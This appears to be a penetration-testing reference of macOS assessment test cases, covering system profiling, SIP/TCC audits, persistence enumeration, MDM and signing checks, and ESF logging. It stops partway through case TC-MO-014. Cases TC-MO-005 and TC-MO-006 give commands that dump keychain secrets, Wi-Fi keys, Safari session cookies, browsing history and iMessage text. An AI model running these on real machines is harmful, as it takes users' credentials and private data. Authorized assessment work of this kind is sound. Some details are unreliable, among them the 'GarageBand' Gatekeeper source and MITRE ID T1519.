# macOS Security Assessment Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, a dedicated test Mac (bare-metal or VM with snapshots), or a developer machine you own. Never run active exploitation against a production Mac without explicit written authorization.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Recon & System Profiling | 1 | LOW |
| B. SIP / TCC Assessment | 2 | LOW - MEDIUM |
| C. Persistence Enumeration | 1 | MEDIUM |
| D. Credential Extraction | 2 | HIGH - CRITICAL |
| E. MDM & Code Signing | 2 | MEDIUM - HIGH |
| F. Mach-O / Binary Analysis | 1 | MEDIUM |
| G. ESF / Defender Telemetry | 1 | LOW - HIGH |
| H. Apple Silicon Specifics | 2 | LOW - HIGH |
| I. Apple Silicon Boot Chain & PPL | 1 | LOW - HIGH |
| J. ESF Deep Dive | 2 | LOW - HARD |
| K. TCC Deep Dive | 1 | HIGH - CRITICAL |
| L. MDM Profile Abuse | 1 | CRITICAL |
| M. Keychain Offline Cracking | 1 | CRITICAL |
| **Total** | **18** | **LOW - CRITICAL** |

---

## A. Recon & System Profiling

### TC-MO-001: macOS System Profiling

| Field | Value |
|------|-----|
| **ID** | TC-MO-001 |
| **Title** | System Profiling — Version, Architecture, Hardware, FileVault, Admin Membership |
| **Objective** | Establish a baseline understanding of the target macOS host: OS version, hardware architecture (Apple Silicon vs Intel), FileVault state, current user privilege, and security software presence. |
| **Steps** | 1. `sw_vers` — record ProductVersion and BuildVersion.<br>2. `uname -m` — record architecture (`arm64` for Apple Silicon, `x86_64` for Intel).<br>3. `system_profiler SPHardwareDataType` — record ModelIdentifier, Chip (for Apple Silicon), Boot ROM version, Serial Number, Hardware UUID.<br>4. `csrutil status` and `csrutil authenticated-root status` — record SIP configuration and Apple Silicon sealed-snapshot state.<br>5. `fdesetup status` — record FileVault on/off state.<br>6. `id` and `groups` — record current UID, primary group, supplementary groups; confirm whether the user is a member of `admin` (GID 80) or `wheel`.<br>7. `ps aux \| grep -iE "falcon\|sentinel\|defender\|jamfProtect\|cylance\|carbon"` and `launchctl list \| grep -iE "falcon\|sentinel\|defender\|jamf"` — enumerate any commercial EDR / security tools running on the host.<br>8. `systemextensionsctl list` — enumerate installed System Extensions (often includes EDR, network filter, FDE). |
| **Expected Result** | A complete inventory of the host: macOS version, architecture, hardware model, SIP status, FileVault status, current user privilege, and any security software installed. Identify the next-step attack surface based on what is (and is not) present. |
| **Tools** | Bash, system_profiler, csrutil, fdesetup, ps, launchctl, systemextensionsctl |
| **MITRE** | T1082-System Information Discovery, T1069-Permission Groups Discovery, T1087-Account Discovery |
| **Difficulty** | Easy |
| **Tags** | recon, profiling, sip, filevault, architecture |

---

## B. SIP / TCC Assessment

### TC-MO-002: System Integrity Protection (SIP) Status Check

| Field | Value |
|------|-----|
| **ID** | TC-MO-002 |
| **Title** | SIP Status, Boot Args, and Sealed System Snapshot Verification |
| **Objective** | Determine the active SIP configuration on the target host: fully enabled, custom (partial), or disabled. Detect whether the system volume's sealed snapshot is intact (Apple Silicon / Intel T2). |
| **Steps** | 1. `csrutil status` — record the full output. Look for "enabled." (fully protected) vs "Custom Configuration:" with specific flags (partial) vs "disabled." (unprotected).<br>2. `csrutil authenticated-root status` — Apple Silicon / Intel T2 only. Should report "enabled" (sealed snapshot is active).<br>3. `mount \| grep "on / "` — confirm the system volume is mounted `sealed,read-only` (Apple Silicon) or `read-only` (older Intel).<br>4. `nvram boot-args` (requires sudo) — should be empty on production hosts. Non-empty values such as `amfi_get_out_of_my_way=1`, `debug=0x14e`, or `kext-dev-mode=1` indicate developer / debug configuration.<br>5. Attempt to write to a SIP-protected path: `sudo touch /System/test 2>&1` — on a SIP-enabled host this returns "Operation not permitted." On SIP-disabled hosts the write succeeds and `/System/test` exists (delete after test).<br>6. `diskutil apfs list` — inspect the System volume's snapshot list. A sealed snapshot entry under the System volume confirms authenticated-root is active. |
| **Expected Result** | Either (a) SIP fully enabled, sealed snapshot active, no debug boot-args, write test fails — informational, hardening is correct; or (b) SIP disabled, custom, sealed snapshot disabled, debug boot-args present, or write test succeeds — HIGH finding, host is broadly vulnerable. |
| **Tools** | csrutil, mount, nvram, diskutil, Bash |
| **MITRE** | T1068-Exploitation for Privilege Escalation, T1574-Hijack Execution Flow |
| **Difficulty** | Easy |
| **Tags** | sip, sealed-snapshot, boot-args, csrutil, hardening-audit |

### TC-MO-003: TCC Database Audit

| Field | Value |
|------|-----|
| **ID** | TC-MO-003 |
| **Title** | TCC.db Audit — Identify Full Disk Access, Accessibility, and Automation Grants |
| **Objective** | Enumerate every TCC (Transparency, Consent, and Control) grant recorded in both the user and system TCC databases. Identify high-impact grants (Full Disk Access, Accessibility, Apple Events / Automation, Screen Capture) made to non-Apple binaries. |
| **Steps** | 1. `sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT service, client, client_type, auth_value, auth_reason, last_modified FROM access ORDER BY service;"` — enumerate user TCC grants. Note that the calling Terminal/iTerm must have Full Disk Access already, or sqlite3 will error with "operation denied."<br>2. Decode `auth_value`: `0 = denied`, `2 = allowed`, `3 = limited`. Decode `client_type`: `0 = bundle ID`, `1 = absolute path`.<br>3. `sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT service, client, auth_value FROM access ORDER BY service;"` — enumerate system TCC grants (requires sudo).<br>4. Filter for high-impact grants: `WHERE service IN ('kTCCServiceSystemPolicyAllFiles', 'kTCCServiceAccessibility', 'kTCCServiceAppleEvents', 'kTCCServiceScreenCapture') AND auth_value = 2`.<br>5. For each high-impact grant, check the binary's code signing: `codesign -dvvv <client-path-or-bundle>` — identify whether it's Apple-signed (low risk) or a third-party Developer ID (potential abuse vector).<br>6. Cross-reference with the running process list (`ps aux \| grep <client>`) — a granted binary that is no longer installed or runs from an unexpected path is suspicious. |
| **Expected Result** | Complete TCC grant inventory. Identify (a) any Full Disk Access grant to a non-Apple binary (HIGH — that binary can read Mail, Messages, Safari History, Keychain), (b) any Accessibility grant to a non-Apple binary (HIGH — that binary can drive other apps via Apple Events), (c) any Automation grant (HIGH — can script other apps to inherit their TCC grants). |
| **Tools** | sqlite3, codesign, ps, Bash |
| **MITRE** | T1078-Valid Accounts (TCC grant abuse), T1059.002-AppleScript, T1555-Credentials from Password Stores |
| **Difficulty** | Medium |
| **Tags** | tcc, privacy, full-disk-access, accessibility, automation |

---

## C. Persistence Enumeration

### TC-MO-004: LaunchAgents / LaunchDaemons Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-MO-004 |
| **Title** | Persistence Enumeration via LaunchAgents, LaunchDaemons, and KnockKnock Locations |
| **Objective** | Enumerate every macOS persistence location and identify suspicious or unknown items. Cover user LaunchAgents, system LaunchAgents, system LaunchDaemons, login items, Spotlight importers, QuickLook plugins, browser extensions, and System Extensions. |
| **Steps** | 1. `ls -l ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/` — enumerate the three primary persistence paths.<br>2. For each plist, `plutil -p <plist>` — read Label, ProgramArguments, RunAtLoad, KeepAlive, StartInterval, WatchPaths.<br>3. `launchctl list \| grep -v "^-"` — list currently-loaded services (PID + Status + Label). Cross-reference with the plist files; loaded-but-no-plist items are suspicious (loaded then deleted).<br>4. `systemextensionsctl list` — enumerate System Extensions (Apple Silicon / modern macOS).<br>5. `kextstat \| grep -v com.apple` — enumerate third-party kernel extensions (legacy; usually empty on modern macOS).<br>6. Enumerate secondary persistence: `ls ~/Library/Spotlight/ /Library/Spotlight/ ~/Library/QuickLook/ /Library/QuickLook/ ~/Library/Internet\ Plug-Ins/ ~/Library/Screen\ Savers/ ~/Library/Mail/Bundles/ ~/Library/Workflows/Applications/Folder\ Actions/ ~/Library/Application\ Support/Google/Chrome/Default/Extensions/ ~/Library/Application\ Support/Firefox/Profiles/*/extensions/ ~/Library/Safari/Extensions/`.<br>7. Check legacy hooks: `defaults read /Library/Preferences/com.apple.loginwindow LoginHook 2>/dev/null`, `defaults read /Library/Preferences/com.apple.loginwindow LogoutHook 2>/dev/null`, `crontab -l`, `cat /etc/crontab`, `ls /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/`.<br>8. If KnockKnock (Objective-See) is installed, run it for a GUI-assisted enumeration of all ~50 locations. |
| **Expected Result** | Complete inventory of all persistence items, grouped by location and scope (user vs system). Each item's code signing should be checked (`codesign -dvvv <binary>`). Items signed by unknown Developer IDs or unsigned binaries warrant deeper analysis. |
| **Tools** | ls, plutil, launchctl, systemextensionsctl, kextstat, defaults, KnockKnock (optional GUI) |
| **MITRE** | T1547.001-Registry Run Keys (LaunchAgents analog), T1547.011-Plist Modification, T1037-Boot or Logon Initialization Commands |
| **Difficulty** | Medium |
| **Tags** | persistence, launchagents, launchdaemons, login-items, system-extensions |

---

## D. Credential Extraction

### TC-MO-005: Keychain Extraction via `security` CLI

| Field | Value |
|------|-----|
| **ID** | TC-MO-005 |
| **Title** | User Keychain Enumeration and Secret Extraction |
| **Objective** | Enumerate the user's login keychain (`~/Library/Keychains/login.keychain-db`) and extract secret values via the Apple-supported `security` CLI. Validate the engagement impact of a foothold on a Mac with the user logged in. |
| **Steps** | 1. `security list-keychains` — confirm the user keychain path.<br>2. `security dump-keychain ~/Library/Keychains/login.keychain-db \| grep -E '"svce"\|"acct"\|"desc"'` — enumerate entry metadata (no secrets).<br>3. `security find-generic-password -l "Wi-Fi SSID Name" -d ~/Library/Keychains/login.keychain-db -w` — extract a Wi-Fi PSK (prompts user for keychain password).<br>4. `security find-internet-password -s "example.com" -w` — extract a saved website password (prompts user).<br>5. `security dump-keychain -d ~/Library/Keychains/login.keychain-db > /tmp/keychain_dump.txt` — extract ALL items with secret values (prompts repeatedly for keychain password; on macOS 13+ this is one prompt per item unless the calling binary is signed and entitled).<br>6. `wc -l /tmp/keychain_dump.txt` and `grep -c "password:" /tmp/keychain_dump.txt` — quantify the extraction.<br>7. `sudo security find-generic-password -ga "REPLACE_WITH_YOUR_SSID" /Library/Keychains/System.keychain -w` — extract a Wi-Fi PSK from the SYSTEM keychain (requires sudo, no user prompt).<br>8. `security find-certificate -a /Library/Keychains/System.keychain \| grep -iE "MDM\|Profile"` — enumerate MDM / SCEP certificates (potential enrollment identity theft). |
| **Expected Result** | A populated `/tmp/keychain_dump.txt` containing every keychain entry with its plaintext secret (after user authorization). For Wi-Fi: extracted PSK. For websites: extracted credentials. For system keychain: Wi-Fi PSKs and MDM identity without user prompt. Demonstrates the credential impact of any foothold on a logged-in Mac. |
| **Tools** | security CLI, sqlite3 (for system TCC audit), sudo |
| **MITRE** | T1555.001-Credentials from Keychain, T1555-Credentials from Password Stores |
| **Difficulty** | Medium |
| **Tags** | keychain, credentials, security-cli, wifi-psk, mdm-identity |

### TC-MO-006: Cookies.binarycookies and Safari History Extraction

| Field | Value |
|------|-----|
| **ID** | TC-MO-006 |
| **Title** | Safari Cookies and History Database Extraction |
| **Objective** | Extract live session tokens and browsing history from Safari's non-standard `Cookies.binarycookies` format and the SQLite `History.db` database. Demonstrate the impact of Full Disk Access to the user's home directory. |
| **Steps** | 1. Confirm Full Disk Access for the calling process: `ls ~/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies` — should succeed (no "Operation not permitted"). If it fails, the test is moot; document that FDA is required.<br>2. Parse the binary cookies file with a community tool: `cookie-reader ~/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies \| head -50` OR a Python parser (see payloads.md §7).<br>3. Extract session tokens (the `value` column for each cookie) — note the domain and identify high-value targets (e.g., `*.google.com`, `*.github.com`, banking domains).<br>4. Open the Safari history database: `sqlite3 ~/Library/Safari/History.db ".tables"` — should show `history_items` and `history_visits`.<br>5. Query recent history: `sqlite3 ~/Library/Safari/History.db "SELECT url, datetime(visit_time + 978307200, 'unixepoch', 'localtime') AS visit_dt FROM history_items JOIN history_visits ON history_items.id = history_visits.history_item ORDER BY visit_time DESC LIMIT 50;"`.<br>6. Optionally pivot to other browsers: `sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Cookies "SELECT host_key, name, encrypted_value FROM cookies LIMIT 10;"` (encrypted with key from "Chrome Safe Storage" keychain entry).<br>7. Optionally pivot to Messages: `sqlite3 ~/Library/Messages/chat.db "SELECT datetime(date/1000000000 + 978307200, 'unixepoch', 'localtime') AS msg_time, text FROM message ORDER BY date DESC LIMIT 20;"`. |
| **Expected Result** | Extracted live session tokens (replayable at `*.example.com` for hours to weeks), full browsing history, and iMessage text content. CRITICAL impact: any Full Disk Access grant to a binary on this Mac yields the user's full digital trail. |
| **Tools** | sqlite3, cookie-reader (or community Python parser), Bash |
| **MITRE** | T1555.003-Credentials from Web Browsers, T1552-Unsecured Credentials |
| **Difficulty** | Medium |
| **Tags** | cookies, safari, history, session-tokens, full-disk-access |

---

## E. MDM & Code Signing

### TC-MO-007: MDM Profile Analysis

| Field | Value |
|------|-----|
| **ID** | TC-MO-007 |
| **Title** | Configuration Profile Enumeration, Payload Extraction, and MDM Vendor Identification |
| **Objective** | Enumerate installed configuration profiles on the target Mac, extract their payloads (restrictions, certificates, network config), and identify the MDM vendor and enrollment identity. |
| **Steps** | 1. `profiles list -output user` — enumerate user-scope profiles.<br>2. `sudo profiles list` — enumerate all profiles including system scope.<br>3. For each profile identifier, dump its payload: `sudo profiles show -output open-command -identifier com.example.restrictions > /tmp/profile.plist` then `plutil -p /tmp/profile.plist`.<br>4. Identify the MDM vendor: `sudo defaults read /Library/Preferences/com.apple.mdm 2>/dev/null` and `sudo defaults read /Library/Managed\ Preferences/com.apple.mdm 2>/dev/null`. Look for `ServerURL`, `Topic` (APNs topic), `EnrollmentID`.<br>5. Identify the MDM enrollment identity in the System keychain: `sudo security find-certificate -a -c "MDM" /Library/Keychains/System.keychain` and `sudo security find-certificate -a -c "Profile" /Library/Keychains/System.keychain`.<br>6. Check DEP status: `profiles show -type enrollment` — `Enrolled` means the Mac auto-re-enrolls on next wipe; `Not Enrolled` means profiles can be removed via System Settings (unsupervised).<br>7. Inspect on-disk profile storage: `sudo ls -l /var/db/ConfigurationProfiles/ /var/db/ConfigurationProfiles/Setup/ /var/db/ConfigurationProfiles/Settings/` — look for unexpected or non-Apple profile data files. |
| **Expected Result** | Complete inventory of installed profiles, their payloads, the MDM vendor, and the enrollment identity. Identify whether the Mac is supervised (DEP) or unsupervised (profile removal is possible). Flag any profile signed by an unexpected vendor. |
| **Tools** | profiles CLI, defaults, security CLI, plutil, sudo |
| **MITRE** | T1098-Account Manipulation (MDM enrollment abuse), T1078-Valid Accounts (enrollment identity theft) |
| **Difficulty** | Medium |
| **Tags** | mdm, profiles, dep, enrollment-identity, jamf, intune |

### TC-MO-008: Code Signing and Notarization Verification

| Field | Value |
|------|-----|
| **ID** | TC-MO-008 |
| **Title** | Code Signature, Entitlement, Gatekeeper Assessment, and Notarization Status Verification |
| **Objective** | For a target Mach-O binary or `.app` bundle, fully characterize its code signature: identifier, Team ID, certificate chain, entitlements, Hardened Runtime flag, and notarization status. Identify the binary's risk profile for red team / IR analysis. |
| **Steps** | 1. `codesign -dvvv /Applications/SomeApp.app` — record Identifier, TeamIdentifier, Authority chain, CodeDirectory version, flags.<br>2. `codesign -d --entitlements - /Applications/SomeApp.app` — extract the entitlements plist. Look for high-risk entitlements: `com.apple.security.cs.allow-jit`, `com.apple.security.cs.disable-library-validation`, `com.apple.security.cs.disable-executable-page-protection`, `com.apple.security.cs.allow-unsigned-executable-memory`, `com.apple.security.device.camera`, `com.apple.security.device.microphone`, `com.apple.security.network.client`, `com.apple.developer.endpoint-security.client` (ESF).<br>3. `codesign --verify --verbose=4 /Applications/SomeApp.app` — verify the signature against the trust chain. Should report "valid on disk" and "satisfies its Designated Requirement."<br>4. `xattr -l /Applications/SomeApp.app` — check for `com.apple.quarantine` (downloaded via browser/mail) vs absent (extracted locally or installed via package).<br>5. `spctl --assess --type execute --verbose /Applications/SomeApp.app` — Gatekeeper assessment. Output should be "accepted" with `source=Notarized Developer ID` (or `Developer ID` without notarization, or `GarageBand` for Apple-signed).<br>6. `xcrun stapler validate /Applications/SomeApp.app` — confirm the notarization ticket is stapled (offline-verifiable).<br>7. Optionally drag-drop into Equity (GUI) for a unified view of signing + notarization + entitlements. |
| **Expected Result** | Full characterization of the binary's signing posture. Flag any: (a) unsigned binary (will fail Gatekeeper), (b) ad-hoc signed binary (only valid for local execution), (c) Developer ID signed without notarization (will fail Gatekeeper on download), (d) Developer ID signed with high-risk entitlements (e.g., `disable-library-validation`), (e) ESF entitlement present (binary can monitor process exec / file writes — high blast radius). |
| **Tools** | codesign, spctl, xattr, xcrun (stapler, notarytool), Equity (GUI) |
| **MITRE** | T1218.009-Signed Binary Proxy Execution, T1036-Masquerading, T1553-Subvert Trust Controls |
| **Difficulty** | Medium |
| **Tags** | codesign, entitlements, gatekeeper, notarization, hardened-runtime, spctl |

---

## F. Mach-O / Binary Analysis

### TC-MO-009: Mach-O Static Analysis with otool and jtool2

| Field | Value |
|------|-----|
| **ID** | TC-MO-009 |
| **Title** | Mach-O Architecture, Load Commands, Linked Libraries, and Symbol Table Analysis |
| **Objective** | Statically characterize a target Mach-O binary: architecture (arm64 / arm64e / x86_64 / fat), Mach-O header, load commands, linked libraries, symbol table, Objective-C class metadata, and code-signing details. Lay the groundwork for dynamic analysis. |
| **Steps** | 1. `file /tmp/target_binary` — record architecture(s). For a fat binary, note both archs.<br>2. `lipo -info /tmp/target_binary` — fat header info.<br>3. `otool -hv /tmp/target_binary` — Mach-O header (magic, cputype, cpusubtype, filetype, ncmds, flags).<br>4. `otool -l /tmp/target_binary \| head -100` — load commands. Identify: `LC_SEGMENT_64` (__TEXT, __DATA, __LINKEDIT), `LC_LOAD_DYLIB` (linked libraries), `LC_CODE_SIGNATURE`, `LC_UUID`, `LC_MAIN`, `LC_RPATH`, `LC_BUILD_VERSION`.<br>5. `jtool2 -l /tmp/target_binary` — alternative load-command dump (cleaner output).<br>6. `otool -L /tmp/target_binary` — linked libraries. Flag non-system dylibs (`grep -v "/usr/lib/"`).<br>7. `nm -p /tmp/target_binary \| head -50` — symbol table. Use `nm -u` for undefined (external) symbols, `nm -g` for defined external (exported) symbols.<br>8. `otool -ov /tmp/target_binary 2>/dev/null \| head -100` — Objective-C class metadata (class names, method names, ivars). Useful for runtime hooking targets.<br>9. `codesign -dvvv /tmp/target_binary` and `codesign -d --entitlements - /tmp/target_binary` — code signing and entitlements.<br>10. `strings /tmp/target_binary \| grep -iE "http\|api\|key\|secret\|password\|token\|curl\|wget\|/bin/\|/usr/"` — security-relevant strings (URLs, C2 indicators, hardcoded credentials).<br>11. For arm64e binaries: disassemble with `jtool2 -d --arch arm64e /tmp/target_binary` or open in Hopper/Ghidra and look for `pacia` / `autia` / `retab` instructions indicating Pointer Authentication Codes. |
| **Expected Result** | Complete static profile of the binary. Identify (a) what architecture(s) it targets, (b) what libraries it depends on (and any non-standard ones), (c) what entry points and exported symbols exist, (d) whether it uses Objective-C and what class names it exposes, (e) what entitlements and signing posture it has, (f) what URLs / paths / secrets are visible in strings. |
| **Tools** | file, lipo, otool, jtool2, nm, codesign, strings, Hopper/Ghidra (optional GUI) |
| **MITRE** | T1010-Application Window Discovery (analog: binary capability discovery), T1059-Native API identification |
| **Difficulty** | Medium |
| **Tags** | mach-o, otool, jtool2, load-commands, symbols, objc, pac |

---

## G. ESF / Defender Telemetry

### TC-MO-010: KnockKnock Persistence Scan

| Field | Value |
|------|-----|
| **ID** | TC-MO-010 |
| **Title** | KnockKnock-Assisted Comprehensive Persistence Scan |
| **Objective** | Use the Objective-See KnockKnock tool to perform a one-shot scan of all ~50 macOS persistence locations and produce a structured report of every item with its signing posture. |
| **Steps** | 1. Install KnockKnock: `brew install --cask knockknock` or download from `objective-see.org/products.html`.<br>2. Open KnockKnock.app and click "Scan" (GUI flow).<br>3. Wait for the scan to complete (~30s).<br>4. Review the output, which categorizes every persistence item as: green (Apple), yellow (popular 3rd party), red (unknown).<br>5. For each red item, click → "VirusTotal Lookup" (if available) or manually inspect via `codesign -dvvv <path>`.<br>6. Export the JSON results from `~/Library/Application\ Support/com.objectiveSee.KnockKnock/Results.json`.<br>7. Parse the JSON: `jq '.[] \| {name, path, signed, vt}' Results.json \| head -100`.<br>8. Cross-reference red items with the manual enumeration from TC-MO-004 — KnockKnock may catch items missed by manual `ls` (e.g., legacy loginwindow hooks, Spotlight importers, Folder Actions). |
| **Expected Result** | Complete persistence inventory with signing status. Any red (unknown) item warrants deeper analysis — could be malware, could be an unsigned internal tool. Either finding is actionable. |
| **Tools** | KnockKnock (Objective-See), jq, codesign |
| **MITRE** | T1547-Boot or Logon Autostart (detection), T1519-Embedded Hooks |
| **Difficulty** | Easy |
| **Tags** | knockknock, persistence-scan, objective-see, signature-verification |

### TC-MO-011: Endpoint Security Framework Event Logging

| Field | Value |
|------|-----|
| **ID** | TC-MO-011 |
| **Title** | ESF Event Capture via eslogger and Process-Tree Timeline Construction |
| **Objective** | Capture macOS Endpoint Security framework events (process exec, file open/write, authentication) for a defined window, build a process-tree timeline of attacker activity, and demonstrate that the same data commercial EDR sees is available to any local admin. |
| **Steps** | 1. `which eslogger` — confirm eslogger is available (ships with macOS 13+).<br>2. `eslogger --list-events` — review the full list of subscribable event types.<br>3. Start a background capture of exec events: `sudo eslogger exec open write > /tmp/esf.log &` and record the PID.<br>4. Trigger activity: open a Terminal, run `curl https://example.com`, then `osascript -e 'tell application "Finder" to get name of every disk'`, then `security find-generic-password -l test 2>/dev/null`.<br>5. Stop the capture: `kill <PID>`. Confirm log size: `wc -l /tmp/esf.log`.<br>6. Extract the exec events: `jq -r 'select(.event_type == "exec") \| "\(.event.exec.target.process_audit_token.process_id) \(.event.exec.target.executable.path)"' /tmp/esf.log \| sort -u \| head -30`.<br>7. Build a parent-child process tree: for each exec event, the message includes both `target` and `parent` audit tokens — use `jq` to extract both PIDs and the parent executable path, then construct a tree.<br>8. Filter for write events targeting LaunchAgents: `jq -r 'select(.event_type == "write" and (.event.write.target.path \| test("/Library/(LaunchAgents\|LaunchDaemons)/.*\\\\.plist$")))' /tmp/esf.log`.<br>9. Filter for TCC.db writes: `jq -r 'select(.event_type == "write" and (.event.write.target.path \| contains("TCC.db")))' /tmp/esf.log`. |
| **Expected Result** | A `/tmp/esf.log` containing ESF events for the test window, a sorted unique list of executed binaries, and a process tree showing parent→child relationships. Demonstrate that the data captured by commercial EDR (Falcon, SentinelOne, Jamf Protect, Defender for Endpoint) is identical to what eslogger produces — i.e., defenders and attackers have symmetric visibility. |
| **Tools** | eslogger (built-in), jq, Bash, sudo |
| **MITRE** | T1057-Process Discovery (defender), T1082-System Information Discovery (defender), T1547-detection |
| **Difficulty** | Hard |
| **Tags** | esf, eslogger, edr-telemetry, process-tree, defender-perspective |

---

## H. Apple Silicon Specifics

### TC-MO-012: Apple Silicon PAC and Sealed System Snapshot Verification

| Field | Value |
|------|-----|
| **ID** | TC-MO-012 |
| **Title** | Apple Silicon Architecture, Pointer Authentication Code (PAC) Detection, and Sealed System Snapshot Integrity Verification |
| **Objective** | On an Apple Silicon Mac, verify the active state of arm64e Pointer Authentication Codes (PAC), confirm the sealed system snapshot is intact, and reason about the implications for memory-corruption exploitation and persistence. |
| **Steps** | 1. `uname -m` — should report `arm64` (userland). Kernel and system binaries may use `arm64e`.<br>2. `sysctl -n hw.optional.arm64e` — should be `1` on M1 and later (PAC capability present).<br>3. `sysctl -n hw.optional.armv8_3_jscvt` — JavaScript conversion (ARMv8.3 indicator).<br>4. `sysctl -n hw.optional.armv8_4_fhm` — half-precision FP (ARMv8.4 indicator).<br>5. `csrutil authenticated-root status` — should report "enabled" on a default Apple Silicon Mac. If "disabled," the sealed snapshot has been bypassed (only possible after `csrutil disable` + `csrutil authenticated-root disable` in Recovery).<br>6. `mount \| grep "on / "` — confirm `/` is mounted `apfs,sealed,local,read-only`.<br>7. `diskutil apfs list` — find the System volume (typically `disk1s5` or `disk3s5`) and confirm it has a Snapshot entry (e.g., `Snapshot of com.apple.battery.YYYY-MM-DD-...UTC`).<br>8. Verify Rosetta 2 status: `pgrep oahd >/dev/null && echo "Rosetta 2 active" \|\| echo "Rosetta 2 inactive"`. If installed, list running translated processes: `ps -A -o pid,comm,arch \| awk '$3 == "i386"'`.<br>9. Disassemble a system binary (e.g., `/bin/ls`) with `jtool2 -d /bin/ls 2>/dev/null \| head -100` and look for PAC instructions (`pacia`, `pacib`, `autia`, `autib`, `retaa`, `retab`, `braa`, `blraa`). Document whether PAC instructions are present at function prologues/epilogues.<br>10. Attempt to write to the system volume: `sudo touch /System/test 2>&1` — should fail with "Operation not permitted" (SIP-protected). On a sealed-snapshot-disabled host the write may also fail because `/` is still read-only at the mount level, but the snapshot seal is broken.<br>11. Inspect the APFS firmlinks: `cat /usr/share/firmlinks` — each line pairs a System volume path with a Data volume path (e.g., `/etc /private/etc`). Verify the file is intact (Apple-controlled). |
| **Expected Result** | Either (a) Apple Silicon with PAC enabled (`hw.optional.arm64e=1`), authenticated-root enabled (sealed snapshot active), `/` mounted `apfs,sealed,read-only`, system volume has a snapshot, Rosetta 2 status confirmed, PAC instructions present in system binaries — informational, hardening is correct; or (b) any of these checks fails — HIGH finding, host is more vulnerable to memory-corruption exploitation, persistence in protected paths, or kernel-cache tampering. |
| **Tools** | uname, sysctl, csrutil, mount, diskutil, jtool2, ps, pgrep, Bash |
| **MITRE** | T1068-Exploitation for Privilege Escalation (PAC / sealed snapshot bypass detection), T1574-Hijack Execution Flow |
| **Difficulty** | Hard |
| **Tags** | apple-silicon, pac, arm64e, sealed-snapshot, rosetta-2, apfs, ssv |

---

## I. Apple Silicon Boot Chain & PPL

### TC-MO-013: Apple Silicon Boot Chain Verification

| Field | Value |
|------|-----|
| **ID** | TC-MO-013 |
| **Title** | Apple Silicon Boot Chain Reconstruction — Boot ROM, iBoot, Kernel Cache, SSV Integrity |
| **Objective** | Reconstruct the verified boot chain on an Apple Silicon Mac and identify any tampering indicators. Verify the Signed System Volume (SSV) seal, the kernel cache signature, and the firmlinks pairing. |
| **Prerequisite** | Apple Silicon Mac (M1/M2/M3/M4); sudo access; the host must NOT have `amfi_get_out_of_my_way=1` or `csrutil disable` already applied (otherwise the test is moot). Document the firmware/macOS version before testing. |
| **Steps** | 1. `sw_vers` and `system_profiler SPHardwareDataType` — record macOS build, chip model, boot ROM version.<br>2. `csrutil authenticated-root status` — should report "Authenticated Root status: enabled" on default Apple Silicon.<br>3. `mount \| grep "on / "` — confirm `/` is `apfs,sealed,local,read-only,rooted` (SSV is sealed).<br>4. `diskutil apfs info /` — show volume details; the "System" volume should have a Snapshot of `com.apple.battery.YYYY-MM-DD-...UTC`.<br>5. `cat /usr/share/firmlinks \| head -20` — list firmlink pairs; e.g., `/etc : /private/etc`, `/var : /private/var`. Verify no non-Apple paths are firmlinked.<br>6. `nvram boot-args` (sudo) — should be empty on production hosts. Non-empty values like `amfi_get_out_of_my_way=1`, `debug=0x14e`, `kext-dev-mode=1`, `csr-active-config` indicate developer mode.<br>7. `sudo kmutil showstage` — show boot stage hashes (BootPolicy, KernelManagerment, RecoveryOS Policy).<br>8. Check the Secure Enclave: `ioreg -l \| grep -A2 "AppleSEP"` — confirm the SEP is enumerated.<br>9. Verify Local Policy / FW password: `sudo dmtool` (Apple Silicon) shows the LocalPolicy status. |
| **Expected Result** | Either (a) boot chain fully verified: authenticated-root enabled, SSV sealed, no debug boot-args, firmlinks intact — informational, hardening is correct; or (b) any indicator is anomalous (boot-args set, SSV not sealed, firmlinks tampered) — HIGH finding. |
| **Remediation** | On a tampered host: reboot into Recovery (hold power button on Apple Silicon), run `csrutil clear` and `csrutil authenticated-root disable` then re-enable to reset. Reinstall macOS from IPSW if SSV is permanently broken. Document the indicator as a host-compromise artifact. |
| **Verification Checklist** | [ ] macOS build recorded; [ ] chip/boot ROM recorded; [ ] authenticated-root status checked; [ ] SSV seal confirmed via mount; [ ] firmlinks intact; [ ] boot-args empty; [ ] SEP present; [ ] boot stage hashes recorded. |
| **Tools** | sw_vers, system_profiler, csrutil, mount, diskutil, nvram, kmutil, ioreg, dmtool, sudo |
| **MITRE** | T1068-Exploitation for Privilege Escalation (boot chain tampering detection), T1574-Hijack Execution Flow |
| **Difficulty** | Hard |
| **Tags** | apple-silicon, boot-chain, ssv, firmlinks, sep, iBoot, authenticated-root |

---

## J. Endpoint Security Framework Deep Dive

### TC-MO-014: Building a Minimal ESF Client

| Field | Value |
|------|-----|
| **ID** | TC-MO-014 |
| **Title** | Construct and Test a Minimal Endpoint Security Framework Client |
| **Objective** | Build a minimal ESF client (a System Extension that subscribes to `exec`, `open`, and `write` events) to demonstrate the same telemetry that commercial EDR (Falcon, Jamf Protect, Defender for Endpoint) consumes. Useful both for defenders (operationalizing ESF) and attackers (modeling what the defender sees). |
| **Prerequisite** | macOS 11+; Apple Developer Account (for code signing with the `com.apple.developer.endpoint-security.client` entitlement — note: this entitlement is now restricted by Apple as of 2023); OR a test host with `amfi_get_out_of_my_way=1` (SIP disabled) to bypass entitlement verification. Familiarity with Swift/C and System Extensions. |
